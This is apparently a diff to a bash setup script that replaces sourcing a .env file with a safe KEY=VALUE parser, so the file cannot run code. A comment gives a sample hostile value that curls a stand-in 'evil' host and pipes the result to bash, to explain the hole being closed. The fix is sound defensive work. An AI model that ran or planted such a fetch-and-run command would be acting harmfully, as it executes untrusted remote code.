@@ -73,11 +73,26 @@ check_prereqs() {
     fi
 }
 
-# Load .env (non-destructive — only sets vars that aren't already set)
+# Load .env (non-destructive — only sets vars that aren't already set).
+# Safe parse: never `source .env` (that executes it as a shell script, so a
+# value like `X=$(curl http://evil/x | bash)` would run). We only export plain
+# KEY=VALUE lines with shell-safe keys.
 load_env() {
-    set -a
-    source "$ROOT_DIR/.env"
-    set +a
+    [[ -f "$ROOT_DIR/.env" ]] || return 0
+    while IFS='=' read -r key value; do
+        # Skip comments and blank lines
+        [[ "$key" =~ ^[[:space:]]*# ]] && continue
+        [[ -z "$key" ]] && continue
+        # Skip keys with shell-unsafe characters
+        [[ "$key" =~ [^A-Za-z0-9_] ]] && continue
+        # Strip one layer of surrounding single/double quotes
+        value="${value%\"}"; value="${value#\"}"
+        value="${value%\'}"; value="${value#\'}"
+        # Non-destructive: only export if not already set
+        if [[ -z "${!key+x}" ]]; then
+            export "$key=$value"
+        fi
+    done < "$ROOT_DIR/.env"
 }
 
 # ─── Redis ─────────────────────────────────────────────────────────
